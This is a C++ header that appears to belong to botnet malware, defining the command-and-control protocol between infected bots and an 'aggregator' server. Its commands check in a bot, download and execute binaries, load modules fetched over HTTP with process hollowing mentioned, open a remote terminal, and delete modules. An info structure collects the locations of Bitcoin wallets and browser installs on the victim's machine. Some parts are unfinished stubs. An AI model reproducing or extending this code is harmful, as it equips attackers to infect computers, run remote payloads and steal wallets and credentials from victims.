/*--------[Comm Protocol Interface]----------------------------------------------------------*/
#pragma once

#ifndef _WINDOWS_
#include <Windows.h>
#endif

#include <vector>

#ifndef CONFIG_OK
#include "../config.h"
#endif

#ifndef DISABLE_LIBRARY_INFO
#ifdef CONFIG_COMPILE64
#pragma message (OUTPUT_PRIMARY "CNC Protocol Version A")
#else 
#pragma message (OUTPUT_PRIMARY "CNC Protocol Version A")
#endif
#endif

/*--------[API]-----------------------------------------------------------------------------*/
#include "api.h"
#include "net/socket.h"
#include "common/mem.h"
#include "common/str.h"
#include "common/id.h"
#include "common/fs.h"
#include "core/info.h"
#include "debug/stdin.h"
#include "crypt/crypt.h"
#include "http/net_download.h"
#include "http/url.h"

#include "debug/stdin.h"

#include "protocol/bot_config.h"


/*--------[Configuration]-------------------------------------------------------------------*/
// Timings 
#define TIMEOUT_HELLO_S				30		// Timeout for a HELLO request
#define TIMEOUT_HELLO_MS			0

#define VIRTUAL_PROC_PROMPT			"[SHELL]=> "

// From bot_config.h
#define SYNC_DB_MAX_NAME_LEN		_CONFIG_SYNC_DB_MAX_NAME_LEN
#define SYNC_DB_MAX_URL_LEN			_CONFIG_SYNC_DB_MAX_URL_LEN
#define SYNC_DB_INVALID_SYNC_ID		_CONFIG_SYNC_DB_INVALID_ID

// Timeouts for sync command
#define SYNC_DB_TIMEOUT				_CONFIG_SYNC_DB_TIMEOUT

// Timeouts for info command
#define INFO_TIMEOUT				_CONFIG_INFO_TIMEOUT

namespace bot_protocol {
	class instance;

/*--------[Constants]-----------------------------------------------------------------------*/
	static const types::TIME32 timeout_info_response	= INFO_TIMEOUT; 

	static const types::TIME32 timeout_hello_s			= TIMEOUT_HELLO_S;
	static const types::TIME32 timeout_hello_ms			= TIMEOUT_HELLO_MS;
	static const LPSTR command_split_token				= " ";
	static const LPSTR _sig_all							= "ALL";
	static const UINT _sig_all_length					= 3;
	static const LPSTR _boolean_true					= "TRUE";
	static const UINT _boolean_true_size				= 4;
	static const LPSTR _boolean_false					= "FALSE";
	static const UINT _boolean_false_size				= 5;
	static const LPSTR virtual_proc_prompt				= VIRTUAL_PROC_PROMPT;


/*--------[Engine Initialization]-----------------------------------------------------------*/
	VOID init(VOID);


/*--------[Types]---------------------------------------------------------------------------*/
	typedef WORD				VAL_WORD,		*VAL_PWORD;
	typedef __int32				VAL_INT32,		*VAL_PINT32;
	typedef __int32				VAL_OFFSET32,	*VAL_POFFSET32;
	typedef __int32				VAL_SIZE32,		*VAL_PSIZE32;
	typedef unsigned __int32	VAL_UINT32,		*VAL_PUINT32;
	typedef unsigned __int32	VAL_UOFFSET32,	*VAL_PUOFFSET32;
	typedef unsigned __int32	VAL_USIZE32,	*VAL_PUSIZE32;
	typedef char				VAL_CHAR,		*VAL_PCHAR;
	typedef bool				VAL_BOOL,		*VAL_PBOOL;
	typedef DWORD				VAL_ID,			*VAL_PID;
	typedef unsigned long far	VAL_VERSION,	*VAL_PVERSION;
	typedef VAL_VERSION			VAL_BUILD,		*VAL_PBUILD;
	typedef struct val_version {
		VAL_VERSION		major;
		VAL_VERSION		minor;
		VAL_BUILD		build;

		val_version(VOID)
		{
			DWORD merged_version = GetVersion();

			major = (VAL_VERSION)(LOBYTE(LOWORD(merged_version)));
			minor = (VAL_VERSION)(HIBYTE(LOWORD(merged_version)));

			if (merged_version < 0x80000000) {
				build = (VAL_BUILD)(HIWORD(merged_version));
			}
		}
	} VAL_VERSION_DATA, *PVAL_VERSION_DATA;


/*--------[Command Parsing]-----------------------------------------------------------------*/
	bool parse_boolean_string(__in const LPSTR input);


/*--------[Command: Hello]------------------------------------------------------------------*/
	// Internal only - no user input
	class proto_hello;

	// Constants
	static const LPSTR	_sig_hello_response			= "VALID";
	static UINT			_sig_hello_size;
	static const LPSTR	_sig_hello					= "HELLO1.0";				// Must be in the first bytes of the request
	static UINT			_sig_hello_end_size;
	static const LPSTR	_sig_hello_end				= "OK";						// Must be the last 2 bytes in the request
	class proto_hello {
	private:
		// Connection socket
		const socket_tools::socket_data		*comm_socket;

		Ptr<str_string>						LocalHostName;

		Ptr<id_info::id>					BotId;

		bool								is_ok;

		// Hello structure
		typedef VOID NO_PARAMETERS;
		typedef struct data {
			VAL_UOFFSET32		hostname; // hostname is null terminated _sig_hello
			VAL_USIZE32			hostname_size;

			VAL_UOFFSET32		id; //16 bytes
			VAL_USIZE32			id_size;

			VAL_UOFFSET32		ok; //_sig_hello_end
			VAL_USIZE32			ok_size;

			data(NO_PARAMETERS)
			{
				hostname		= NULL;
				hostname_size	= 0;
			}
		} DATA, *PDATA;
		PDATA hello_data;

		typedef struct total_buffer_size {
			LPBYTE				raw_buffer;
			UINT				raw_buffer_size;

			total_buffer_size(VOID) 
			{
				raw_buffer		= NULL;
				raw_buffer_size	= 0;
			}
		} TOTAL_BUFFER_SIZE, *PTOTAL_BUFFER_SIZE;
		PTOTAL_BUFFER_SIZE buffer_total;
		PTOTAL_BUFFER_SIZE proto_hello::construct_buffer(__inout const PDATA *data_info,
			__in const str_string& hostname, __in const id_info::id& host_id);

		// Aggregator parsing (input) 
		bool					is_request_ok;

		proto_hello::PDATA proto_hello::parse_buffer(
			__in const socket_tools::data& raw_data,
			__inout str_string** hostname, 
			__inout id_info::id** host_id);

	public:
		// Aggregator parses request
		proto_hello(__in const socket_tools::data& incoming_greeting,
					__in const socket_tools::socket_data *current_connection) :
			LocalHostName(NULL),
			is_ok(false), is_request_ok(false),
			hello_data(NULL),
			comm_socket(current_connection)
			{
				if (incoming_greeting.get_socket(socket_tools::data::TYPE_SOURCE) ==
					INVALID_SOCKET) {
					
					return;
				}
				//this->comm_socket = new socket_tools::socket_data(
				//	incoming_greeting.get_socket(socket_tools::data::TYPE_SOURCE));
				

				str_string *hostname;
				id_info::id *bot_id;
				this->hello_data = parse_buffer(incoming_greeting, &hostname, &bot_id);
				if (this->hello_data == NULL || hostname == NULL || bot_id == NULL) {
					return;
				}
				LocalHostName = hostname;
				BotId = bot_id;

				this->is_request_ok = true;
			}

		// Bot generates request
		proto_hello(__in const socket_tools::socket_data *tx_socket,
					__in const id_info::id& existing_id) :
			LocalHostName(NULL),
			is_ok(false), is_request_ok(false),
			hello_data(NULL),
			comm_socket(tx_socket)
		{
			if (tx_socket->get_socket() == INVALID_SOCKET) {
				return;
			}
			//this->CommSocket = new socket_tools::socket_data(tx_socket.get_socket());

			LPSTR local_host_name = (LPSTR)mem::malloc(MAX_COMPUTERNAME_LENGTH + str::ASCII_CHAR);
			UINT max_length = MAX_COMPUTERNAME_LENGTH + str::ASCII_CHAR;
			BOOL get_status = GetComputerNameA(local_host_name, (LPDWORD)&max_length);
			if (!get_status) {
				mem::free(local_host_name);
				return;
			}
			this->LocalHostName = new str_string(local_host_name);
			mem::free_and_null((LPVOID *)&local_host_name);

			this->buffer_total = construct_buffer(&this->hello_data, *LocalHostName, existing_id);
			if (this->buffer_total == NULL) {
				return;
			}

			this->is_ok = true;
		}

		~proto_hello(NO_PARAMETERS)
		{
			if (hello_data != NULL) {
				//mem::free(this->hello_data);	   //FIXME
				this->hello_data = NULL;
			}
		}

		bool proto_hello::get_is_request_ok(NO_PARAMETERS) const
		{
			return this->is_request_ok;
		}

		// Checks the response for integrity
		bool proto_hello::verify_response(__in const socket_tools::data& raw_data);

		// Sends the response
		bool proto_hello::send_response(NO_PARAMETERS) const;

		bool proto_hello::send_command(NO_PARAMETERS) const;

		bool proto_hello::get_is_ok(NO_PARAMETERS) const
		{
			return this->is_ok;
		}

		id_info::id *proto_hello::get_id(NO_PARAMETERS)
		{
			if (this->BotId.get_value() == NULL) {
				DebugBreak();
				return NULL;
			}

			return this->BotId.get_value();
		}

		id_info::id &proto_hello::get_id_(NO_PARAMETERS)
		{
			return *this->BotId.get_value();
		}
	};

/*--------[Command: Clear Database]---------------------------------------------------------*/
	// CLEARDB [ALL/BotId]
	class proto_cleardb;
	static const CHAR _sig_cleardb_list[]			= { 'C', 'L', 'E', 'A', 'R', 'D', 'B'};
	static const LPSTR _sig_cleardb					= "CLEARDB";
	static const UINT _cleardb_number_of_elements   = 2; 
	bool handler_test_cleardb(__in const text_io::input& raw_data,
		__inout std::vector<bot_protocol::instance *>& active_instances);

	bool handler_cleardb(__in const text_io::input& raw_data,
		__inout std::vector<bot_protocol::instance *>& active_instances);

	bool process_cleardb(__in const socket_tools::data& raw_data, __in const id_info::id& id);

	class proto_cleardb {
	protected:
		// Physical structures
		typedef struct cleardb {
			CHAR	signature[sizeof(_sig_cleardb_list)];
			DWORD	id;	// Must correspond with client ID

			cleardb(void) 
			{
				mem::copy(this->signature, _sig_cleardb, sizeof(_sig_cleardb_list));
				id = 0;
			}
		} CLEARDB, *PCLEARDB;

	protected:
		const socket_tools::socket_data		*active_connection;
		const id_info::id					*id;
		PCLEARDB							command;

	public:
		virtual bool process(void) = 0;

		virtual ~proto_cleardb(void)
		{
			if (command != NULL) { 
				delete this->command;
				this->command = NULL;
			}
		}
	};

	class proto_cleardb_agg : public proto_cleardb {
		
	public:
		proto_cleardb_agg(__in const socket_tools::socket_data& bot_connection,
						  __in const id_info::id& bot_id);

		// Generates request
		virtual bool process(void);

		// Cleanup
		~proto_cleardb_agg(void)
		{
			if (command != NULL) { 
				delete this->command;
				this->command = NULL;
			}
		}
	};

	class proto_cleardb_bot : public proto_cleardb {

	public:
		proto_cleardb_bot(__in const socket_tools::data& raw_request,
						  __in const id_info::id& bot_id);

		// Processes command from aggregator
		virtual bool process(void);

		// Cleanup
		~proto_cleardb_bot(void)
		{

		}
	};

/*--------[Command: Sync]-------------------------------------------------------------------*/
	// Internal only - no user input
	class proto_sync;
	static const CHAR _sig_sync[4] = { 'S', 'Y', 'N', 'C' };
	typedef DWORD SIG_ID;
	static const UINT sync_db_max_name_len  = SYNC_DB_MAX_NAME_LEN;
	static const UINT sync_Db_max_url_len	= SYNC_DB_MAX_URL_LEN; 
	static const SIG_ID invalid_sig			= SYNC_DB_INVALID_SYNC_ID;

	static const types::TIME32 sync_db_cmd_timeout_s  = SYNC_DB_TIMEOUT;
	static const types::TIME32 sync_db_cmd_timeout_ms = 0;

	class proto_sync {
	protected:
		typedef struct request_header {
			CHAR					signature[sizeof(DWORD)];
			DWORD					bot_id;

			request_header(void)
			{
				mem::copy(signature, _sig_sync, sizeof(DWORD));
				bot_id = 0;
			}
		};

		typedef struct raw_header {
			CHAR					signature[sizeof(DWORD)];
			SIG_ID					number_of_syncs;

			raw_header()
			{
				mem::copy(signature, _sig_sync, str::lenA(_sig_sync));
				number_of_syncs = 0;
			}
		} RAW_HEADER, *PRAW_HEADER;

	public:
		typedef struct raw_sync_element {
			DWORD					id;
			CHAR					name[bot_protocol::sync_db_max_name_len];
			CHAR					url[bot_protocol::sync_Db_max_url_len];

			raw_sync_element(void) {
				id = 0;
				mem::zeromem(name, bot_protocol::sync_db_max_name_len);
				mem::zeromem(url, bot_protocol::sync_Db_max_url_len);
			}
		} RAW_SYNC_ELEMENT, *PRAW_SYNC_ELEMENT;

	protected:

		DWORD									sync_id;

		socket_tools::socket_data				*current_connection;
		std::vector<raw_sync_element *>			*raw_sync_objects;
		Ptr<std::vector<raw_sync_element *>>	ReceivedSyncObjects; //As received by the bot from server

		Ptr<raw_header>							ResponseHeader;

	public:
		//virtual ~proto_sync(void);

		LPSTR get_sync_name_at_element(__in const UINT element_number) const
		{
			if (element_number > this->ReceivedSyncObjects->size()) {
				return NULL;
			}

			return (LPSTR)this->ReceivedSyncObjects->at(element_number)->name;
		}

		DWORD get_sync_id(void) const
		{
			return this->sync_id;
		}

		// Returns a specific id element
		RAW_SYNC_ELEMENT *get_sync_element(__in const SIG_ID id) const;

	public: virtual bool process_initial(void) = 0;
	public: virtual bool process_response(void) = 0;
	public: virtual bool get_is_sync_ok(void) const = 0;
	};

	class proto_sync_bot : public proto_sync {
	private:
		Ptr<request_header>		RequestHeader;

	public:
		// Created by bot. Request data sent out. Waits for response by server. Processes response.
		proto_sync_bot::proto_sync_bot(
			__in const socket_tools::socket_data *active_socket,
			__in const id_info::id *current_id);

		// Send data out
		virtual bool process_initial(void);

		// Receive response structures
		virtual bool process_response(void);

		virtual ~proto_sync_bot(void) 
		{

		}

		// Shouldn't be called
		virtual bool get_is_sync_ok(void) const
		{
			return false;
		}

		bool process_sync_list(__in const std::vector<raw_sync_element *>& sync_elements);	 
	};

	class proto_sync_agg : public proto_sync {
	private:
		bool is_sync_ok;

	public:
		// Created by agg. Receive request. Return response structures.
		proto_sync_agg::proto_sync_agg(	__in const socket_tools::socket_data& active_socket);

		// Receive request from bot
		virtual bool process_initial(void);

		// Do nothing
		virtual bool process_response(void);

		virtual ~proto_sync_agg(void)
		{

		}

		virtual bool get_is_sync_ok(void) const
		{
			return this->is_sync_ok;
		}
	};



/*--------[Command: Info]-------------------------------------------------------------------*/
	//Command type: INFO [all/ID]
	//Once the bot is connected & synced, the info command will be used to query
	//client info and record it into the database 
	class proto_info;

	static const UINT	_sig_info_params			= 2;
	static const LPSTR	_sig_info					= "INFO";
	static const UINT	_sig_info_len				= 4;

	// Tests the integrity of the info command
	bool handler_test_info(__in const text_io::input& raw_input,
							__inout std::vector<bot_protocol::instance *>& active_instances);

	// Performs operation on info command
	bool handler_info(__in const text_io::input& raw_input,
					__inout std::vector<bot_protocol::instance *>& active_instances);

	// Performs command data parsing
	bool process_info(__in const socket_tools::data& inbound_data,
					  __in const id_info::id& id);

	// Number of bools
#define NUM_OF_BOOLS 6
#if (NUM_OF_BOOLS != 6)
#error Changed the number of bools. Force edit!!!
#endif
	static const UINT num_of_bools = NUM_OF_BOOLS;


	class bot_protocol::proto_info {
	protected:
		Ptr<str_string>					HostName;
		socket_tools::socket_data		*current_connection;

	public:
		typedef struct info_request {
			CHAR				signature[_sig_info_len];
			UINT				signature_length;

			info_request(void) 
			{
				signature_length = _sig_info_len;
				mem::copy(signature, _sig_info, _sig_info_len);
			}

		} INFO_REQUEST, *PINFO_REQUEST;	

		typedef struct info_data {

			VAL_CHAR			hostname[MAX_COMPUTERNAME_LENGTH + str::ASCII_CHAR];
			VAL_USIZE32			hostname_size;

			VAL_ID				id;
			VAL_USIZE32			id_size;

			VAL_BOOL			is_bitcoin;
			VAL_BOOL			is_chrome;
			VAL_BOOL			is_opera;
			VAL_BOOL			is_firefox;
			VAL_BOOL			is_ie;

			VAL_BOOL			is_user;			// Is the user active?

			CHAR				bitcoin_loc[MAX_PATH + str::ASCII_CHAR];
			CHAR				chrome_loc[MAX_PATH + str::ASCII_CHAR];
			CHAR				opera_loc[MAX_PATH + str::ASCII_CHAR];
			CHAR				firefox_loc[MAX_PATH + str::ASCII_CHAR];
			CHAR				ie_loc[MAX_PATH + str::ASCII_CHAR];

			VAL_VERSION_DATA	version_data;

			SYSTEM_INFO			sys_info;
			OSVERSIONINFOA		os_info;

			info_data(VOID)
			{
				mem::zeromem(hostname, MAX_COMPUTERNAME_LENGTH + str::ASCII_CHAR);

				id = 0;
				hostname_size = id_size = 0;
				is_bitcoin = is_chrome = is_opera = is_firefox = false;

				mem::zeromem(bitcoin_loc, MAX_PATH + str::ASCII_CHAR);
				mem::zeromem(chrome_loc, MAX_PATH + str::ASCII_CHAR);
				mem::zeromem(opera_loc, MAX_PATH + str::ASCII_CHAR);
				mem::zeromem(firefox_loc, MAX_PATH + str::ASCII_CHAR);
				mem::zeromem(ie_loc, MAX_PATH + str::ASCII_CHAR);

				mem::zeromem(&sys_info, sizeof(SYSTEM_INFO));
				mem::zeromem(&os_info, sizeof(OSVERSIONINFOA));
			}
		} INFO_DATA, *PINFO_DATA;
		PINFO_DATA current_info_data;

	protected:
		bool				is_ok;

	public:	
		~proto_info(VOID)
		{
			if (current_info_data != NULL) mem::free(current_info_data);
		}

		virtual bool process(__inopt const client_info::info *data) = 0;
	};

	class proto_info_client : public proto_info {
	protected:
		Buffer2 ServerRequest;

	public:
		proto_info_client::proto_info_client(__in const mem::buffer2& raw_data,
											 __in const socket_tools::socket_data& current_connection);

		// Generate table. Sends a response back to the server
		virtual bool process(__inopt const client_info::info *data);

	};

	class proto_info_agg : public proto_info {
	private:
		Buffer2				RawSendData;

		Ptr<info_data>		InfoData;

	public:
		proto_info_agg::proto_info_agg(__in const socket_tools::socket_data& current_connection);

		// Send/receive response from client
		virtual bool process(__inopt const client_info::info *data);

		proto_info::PINFO_DATA get_client_info(void) const
		{
			 return this->InfoData.get_value();
		}

	};


/*--------[Command: Download]---------------------------------------------------------------*/
	// Download file, commit to disk
	// Command type: DL ALL/ID NAME [local file name] [download location] [autorun] [sync]
#define PROTO_DL_PARAMS	6
	static const UINT proto_dl_params				= PROTO_DL_PARAMS;
	class proto_dl;

	// User input command parameters
	enum {
		PROTO_BIN_MODULE_PARAMETER,
		PROTO_BIN_MODULE_PARAMETER_SIG,
		PROTO_BIN_MODULE_PARAMETER_TARGET,
		PROTO_BIN_MODULE_PARAMETER_NAME,
		PROTO_BIN_MODULE_PARAMETER_LOCAL_PATH,
		PROTO_BIN_MODULE_PARAMETER_AUTORUN,
		PROTO_BIN_MODULE_PARAMETER_SYNC
	};

	// Constants
	static const LPSTR	_sig_dl						= "DL";
	static const UINT	_sig_dl_size				= str::lenA(_sig_dl);
	static const UINT	_sig_dl_params				= proto_dl_params;

	// Checks for the Execute Binary command
	bool handler_test_dl(__in const text_io::input& raw_data,
		__inout std::vector<bot_protocol::instance *>& active_instances);

	bool handler_dl(__in const text_io::input& raw_data,
		__inout std::vector<bot_protocol::instance *>& active_instances);

	// Bot processor
	bool process_dl(__in const socket_tools::data& inbound_data,
					__in const id_info::id& id);

	// Download & Execute binary command
	class proto_dl {
	private:
		Ptr<str_string> FileNameString;

		bool			is_ok;
	public:
		proto_dl(__in const LPSTR file_name, __in const bool autorun, __in const bool sync) :
			FileNameString(new str_string(file_name)),
			is_ok(false)
		{
			LPVOID raw_buffer;
			UINT buffer_size;
			BOOL read_status = fs::read_raw_into_buffer(
				file_name, &buffer_size, (LPVOID *)&raw_buffer);
		}

		~proto_dl(VOID)
		{

		}

		bool proto_dl::get_is_ok(VOID) const
		{

		}
	};

/*--------[Command: Download & Execute]-----------------------------------------------------*/
	static const LPSTR _sig_download_execute = "DLE";
	bool process_download_execute(__in const socket_tools::data& inbound_data,
								  __in const id_info::id& id);


/*--------[Command: Add Module]-------------------------------------------------------------*/
	// This is a sync'd command only in conjunction with the ALL parameter
	// AM [all/bot] [name] [url] [autorun:true/false] [sync]
	// 5 parameters total
	class proto_add_module;
	typedef Ptr<proto_add_module> ProtoAddModule;
	// Parameter constants
	enum {
		PROTO_ADD_MODULE_PARAMETER_SIG,
		PROTO_ADD_MODULE_PARAMETER_TARGET,
		PROTO_ADD_MODULE_PARAMETER_NAME,
		PROTO_ADD_MODULE_PARAMETER_URL,
		PROTO_ADD_MODULE_PARAMETER_AUTORUN,
		PROTO_ADD_MODULE_PARAMETER_SYNC
	};
	static const LPSTR _sig_add_module = "AM";
	static const UINT _add_module_number_of_elements = 6;

	bool handler_test_module(__in const text_io::input& raw_data,
		__inout std::vector<bot_protocol::instance *>& active_instances);

	bool handler_module(__in const text_io::input& raw_data,
		__inout std::vector<bot_protocol::instance *>& active_instances);

	bool process_add_module(__in const socket_tools::data& inbound_data,
							__in const id_info::id& id);

	class proto_add_module {
	private:
		const socket_tools::socket_data	*active_socket;

		Ptr<str_string>				DownloadUrl;
		Ptr<str_string>				Name;
		Ptr<url_library::url>		UrlData;
		LPBYTE						raw_buffer;

		bool						is_ok;

		// struct:url:name (no NULL terminators)
		typedef struct raw_command {
			VAL_WORD				raw_signature;

			VAL_UOFFSET32			url;
			VAL_USIZE32				url_size;

			VAL_UOFFSET32			name;
			VAL_USIZE32				name_size;

			VAL_USIZE32				total_size; // Includes all strings

			VAL_BOOL				is_sync;
			VAL_BOOL				autorun;

			raw_command(VOID) 
			{
				raw_signature		= *(PWORD)_sig_add_module;
				autorun	= is_sync	= false;
				url					= (VAL_UOFFSET32)0;
				url_size			= (VAL_USIZE32)0;
				name				= (VAL_UOFFSET32)0;
				name_size			= (VAL_USIZE32)0;
			}
		} RAW_COMMAND, *PRAW_COMMAND;
		Ptr<RAW_COMMAND> RawCommand;

	public:
		// Constructor will perform command parsing
		proto_add_module(	__in const socket_tools::socket_data *tx_socket,
							__in const text_io::input& raw_data) :
			active_socket(tx_socket),
			is_ok(false),
			DownloadUrl(NULL), Name(NULL),
			RawCommand(NULL), UrlData(NULL),
			raw_buffer(NULL)
		{
			if (active_socket->get_socket() == INVALID_SOCKET) {
				return;
			}

			str_string *raw_string = raw_data.get_string();
			Ptr<std::vector<LPSTR>> RawTokens = raw_string->split_string_by_terminatorA(
				NULL, command_split_token, str::ASCII_CHAR);
			if (RawTokens->size() != _add_module_number_of_elements) {
				DebugBreak();
				return;
			}

			this->RawCommand = new raw_command();

			RawCommand->url_size = str::lenA(RawTokens->at(PROTO_ADD_MODULE_PARAMETER_URL));
			RawCommand->name_size = str::lenA(RawTokens->at(PROTO_ADD_MODULE_PARAMETER_NAME));
			RawCommand->autorun = bot_protocol::parse_boolean_string(RawTokens->at(PROTO_ADD_MODULE_PARAMETER_AUTORUN));
			RawCommand->is_sync = bot_protocol::parse_boolean_string(RawTokens->at(PROTO_ADD_MODULE_PARAMETER_SYNC));
			RawCommand->total_size = sizeof(RAW_COMMAND) + 
				RawCommand->url_size + RawCommand->name_size;
			RawCommand->url = sizeof(RAW_COMMAND);
			RawCommand->name = sizeof(RAW_COMMAND) + RawCommand->url_size;

			/*
#ifndef _CONFIG_SYNC_DB_DISABLE
			// Add to sync_db
			db_sync::sync_database *current_sync_db = db_sync::get_sync_database();
			StrString Url = new str_string(RawCommand->url), 
					Name = new str_string(RawCommand->name);
			current_sync_db->add_sync(db_sync::sync_database::sync_id_type::SYNC_ID_TYPE_AM,
				*Url, *Name);
#endif		*/

			this->raw_buffer = (LPBYTE)mem::malloc(RawCommand->total_size);
			mem::copy(raw_buffer, RawCommand.get_value(), sizeof(RAW_COMMAND));
			mem::copy(&raw_buffer[RawCommand->url], 
				RawTokens->at(PROTO_ADD_MODULE_PARAMETER_URL), RawCommand->url_size);
			mem::copy(&raw_buffer[RawCommand->name], 
				RawTokens->at(PROTO_ADD_MODULE_PARAMETER_NAME), RawCommand->name_size);
									
			this->is_ok = true;
		}

		proto_add_module(__in const socket_tools::data& inbound_data):
			active_socket(NULL),
			is_ok(false),
			DownloadUrl(NULL), Name(NULL), UrlData(NULL),
			RawCommand(new RAW_COMMAND()), 
			raw_buffer(NULL)
		{
			// Parse incoming data
			LPBYTE buffer;
			UINT buffer_size;
			inbound_data.get_buffer((LPVOID *)&buffer, &buffer_size);
			mem::copy(RawCommand.get_value(), buffer, sizeof(RAW_COMMAND));

			// Test signature
			if (RawCommand->raw_signature != *(PWORD)bot_protocol::_sig_add_module) {
				return;
			}

			PCHAR text_buffer = (PCHAR)mem::malloc(RawCommand->name_size + str::ASCII_CHAR);
			mem::copy(text_buffer, &buffer[RawCommand->name], RawCommand->name_size);
			Name = new str_string(text_buffer);
			mem::free(text_buffer);

			text_buffer = (PCHAR)mem::malloc(RawCommand->url_size + str::ASCII_CHAR);
			mem::copy(text_buffer, &buffer[RawCommand->url], RawCommand->url_size);
			DownloadUrl = new str_string(text_buffer);
			mem::free(text_buffer);

			UrlData = new url_library::url(DownloadUrl->to_lpstr());
			if (UrlData->get_is_ok() == false) {
				return;
			}

			// Determine download protocol
			mem::buffer2 *raw_data = NULL;
			if (UrlData->get_is_xtp()) {

				// Preferred XTP protocol
				Ptr<download::xtp_client> XTPDownload = new download::xtp_client(*UrlData);
				bool download_status = XTPDownload->process();
				if ((download_status & XTPDownload->get_is_download_ok()) == false) {
					return;
				}

				raw_data = XTPDownload->get_raw_data();

				// Load module
				module::module_instance *new_module = new module::module_instance(*raw_data,
					*Name, RawCommand->autorun, true);
				if (new_module->get_is_ok() == false) {
					delete new_module;
					return;
				}
				
			} else if (UrlData->get_is_http()) {

				// HTTP Protocol
				Ptr<download::http> HTTPDownload = new download::http(*UrlData);
				bool download_status = HTTPDownload->get_is_ok();
				if (download_status == false) {
					return;
				}

				raw_data = HTTPDownload->get_raw_buffer();

				// Load module
				module::module_instance *new_module = new module::module_instance(*raw_data,
					*Name, RawCommand->autorun, true);
				if (new_module->get_is_ok() == false) {
					delete new_module;
					return;
				}
			} else {
				return;
			}

			this->is_ok = true;
		}

		~proto_add_module(VOID) 
		{
			if (this->raw_buffer != NULL) {
				mem::free(this->raw_buffer);
			}
		}

		bool proto_add_module::get_is_ok(VOID) const
		{
			return this->is_ok;
		}

		bool proto_add_module::send_command(VOID) const
		{
			Buffer2 SendData = new mem::buffer2(this->raw_buffer, this->RawCommand->total_size);
			bool send_status = this->active_socket->send_data(*SendData);
			if (send_status == false) {
				return send_status;
			}

			/*
			INT send_status = send(this->comm_socket, (const char *)this->raw_buffer,
				this->RawCommand->total_size, 0);
			if (send_status != this->RawCommand->total_size) {
				return false;
			}
			*/

			return true;
		}
	};


/*--------[Command: Open Terminal]----------------------------------------------------------*/
	static const LPSTR _sig_open_terminal = "OE";
	bool process_open_terminal(__in const socket_tools::data& inbound_data,
							   __in const id_info::id& id);

/*--------[Command: Restart Bot]------------------------------------------------------------*/
	// Forces a restart of the bot only (not the host computer)
	// Just sends a RESTART signal. The other end will reset itself, and Instance will be destroyed
	// on the aggregator end
	static const LPSTR _sig_restart = "RESTART";
	static const UINT _restart_number_of_elements = 2;

	bool handler_test_restart(__in const text_io::input& raw_data,
		__inout std::vector<bot_protocol::instance *>& active_instances);

	bool handler_restart(__in const text_io::input& raw_data,
						__inout std::vector<bot_protocol::instance *>& active_instances);

	bool process_restart(__in const socket_tools::data& inbound_data, __in const id_info::id& id); 

	class proto_restart {
	private:
		typedef VOID					NO_PARAMETERS;

		const socket_tools::socket_data	*active_connection;

		bool							is_ok;
	public:
		proto_restart(__in const socket_tools::socket_data *tx_socket) :
			active_connection(tx_socket),
			is_ok(false)
		{
			// Send RESTART signal
			//UINT sig_size = str::lenA(_sig_restart);
			//LPBYTE raw_buffer = (LPBYTE)mem::malloc(sig_size);
			//mem::copy(raw_buffer, _sig_restart, sig_size);
			Buffer2 RawData = new mem::buffer2(str::lenA(_sig_restart));
			mem::copy(**RawData, _sig_restart, str::lenA(_sig_restart));

			bool send_status = active_connection->send_data(*RawData);
			if (send_status == false) {
				return;
			}

			/*
			INT send_status = send(tx_socket, (const char *)raw_buffer, sig_size, 0);
			if (send_status != sig_size) {
				mem::free(raw_buffer);
				return;
			}
			*/

			this->is_ok = true;
		}

		~proto_restart(NO_PARAMETERS)
		{

		}

		bool proto_restart::get_is_ok(VOID) const
		{
			return this->is_ok;
		}
	};

/*--------[Command: Delete module]----------------------------------------------------------*/
	// Deletes a specified module (by name) from a single bot, or the entire net.
	// Installs a DELETE command inside the db_sync structures
	// DELETE [ALL/BotId] NAME SYNC
	class proto_delete;
	static const CHAR _sig_delete_list[] = { 'D', 'E', 'L', 'E', 'T', 'E' };
	static const LPSTR _sig_delete = "DELETE";
	static const UINT _proto_delete_max_number_of_elements = 3; // 3 PARAMETERS	  \

	bool handler_test_delete(__in const text_io::input& raw_data,
		__inout std::vector<bot_protocol::instance *>& active_instances);

	bool handler_delete(__in const text_io::input& raw_data,
		__inout std::vector<bot_protocol::instance *>& active_instances);

	bool process_delete(__in const socket_tools::data& raw_data,
						__in const id_info::id& id);

	class proto_delete {
	protected:
		Buffer2				RawData;

		// Main physical structure
		typedef struct delete_raw {
			CHAR	signature[sizeof(_sig_delete_list)];
			DWORD	id;
			UINT	module_name_size;

			delete_raw(void) 
			{
				mem::copy(signature, _sig_delete, sizeof(_sig_delete_list));
				id = 0;
				module_name_size = 0;
			}
		} DELETE_RAW, *PDELETE_RAW;

		PDELETE_RAW	raw_header;

	public:
		virtual bool process(void) = 0;

		virtual ~proto_delete(void)
		{

		}
	};

	class proto_delete_bot : public proto_delete {
	private:
		id_info::id *bot_id;

	public:
		// Receives data from the aggregator
		proto_delete_bot::proto_delete_bot(__in const socket_tools::data& raw_data,
										   __in const id_info::id& id);

		// Performs the delete operation
		virtual bool process(void);

		~proto_delete_bot(void)
		{
			mem::free(this->raw_header);
		}
	};

	class proto_delete_agg : public proto_delete {
	private:
		socket_tools::socket_data *connection;

		StrString ModuleName;

	public:
		// Constructs the object
		proto_delete_agg::proto_delete_agg(__in const socket_tools::socket_data& current_connection,
										   __in const str_string& module_name,
										   __in const id_info::id& id);

		// Sends out signal
		virtual bool process(void);

		~proto_delete_agg(void)
		{
			mem::free(this->raw_header);
		}
	};

/*--------[Commands]------------------------------------------------------------------------*/
	typedef bool (*command_test_handler)(__in const text_io::input& raw_data,
										__inout std::vector<bot_protocol::instance *>& active_instances);		// Parses user input. Determines command_handler

	typedef bool (*command_handler)(__in const text_io::input& raw_data,
									__inout std::vector<bot_protocol::instance *>& active_instances);				// Performs the action. 
	typedef struct command_list {
		LPSTR						signature;
		command_test_handler		handling_test_function;
		command_handler				handling_function;
	} COMMAND_LIST, *PCOMMAND_LIST;
	static const UINT _ref_signature		= 0;
	static const UINT _ref_handler			= 1;
	static const UINT number_of_commands	= 8;
	static const COMMAND_LIST all_commands[number_of_commands] = {
		{	_sig_info,				&handler_test_info,		&handler_info},		// Info command
		{	_sig_download_execute,	NULL,					NULL},				// Downloads a binary, executes it
		{	_sig_add_module,		&handler_test_module,	&handler_module},	// Adds a module, hollow/execute from http download
		{	_sig_open_terminal,		NULL,					NULL},				// Opens a terminal
		{	_sig_restart,			&handler_test_restart,	&handler_restart},
		{	_sig_dl,				&handler_test_dl,		&handler_dl},
		{   _sig_cleardb,			&handler_test_cleardb,	&handler_cleardb},
		{   _sig_delete,			&handler_test_delete,	&handler_delete}
	};
